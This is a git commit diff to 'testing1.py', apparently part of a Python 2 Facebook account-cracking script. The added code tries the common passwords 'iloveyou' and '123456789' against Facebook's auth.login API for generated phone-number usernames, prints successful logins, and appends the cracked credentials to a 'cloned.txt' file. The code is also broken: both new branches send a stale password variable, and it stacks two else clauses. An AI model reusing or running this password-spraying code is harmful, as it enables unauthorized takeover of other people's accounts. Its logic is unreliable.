f53ba88e6c0660ea9b3bb839a02f3653a5fb1e77
daleel32 <33414292+daleel32@users.noreply.github.com>
2021-09-30 02:12:16 +0500

    Update testing1.py

--- testing1.py
+++ testing1.py
@@ -387,8 +387,42 @@ def action():
                                                     cps.write(k+c+user+pass5+'\n')
                                                     cps.close()
                                                     cpb.append(c+user+pass5)
-                                                                                                                                                                                                                
-                                                                                                                                                                                                                
+                                                                                                                                                                                                
+                                           else:
+                                            pass6="iloveyou"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass6
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass6+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass5)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass6 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass6+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass6)
+						
+                                           else:
+                                            pass7="123456789"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  |  ' + pass7
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass7+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass7)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m(OHH NO) ' + k + c + user + '  |  ' + pass7 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass7+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass7)                                                                                                                                                                                                                  
                                                                                                                                                                                                             
                                                                                                                                                                                                             
                                                                                                                                                                                                             
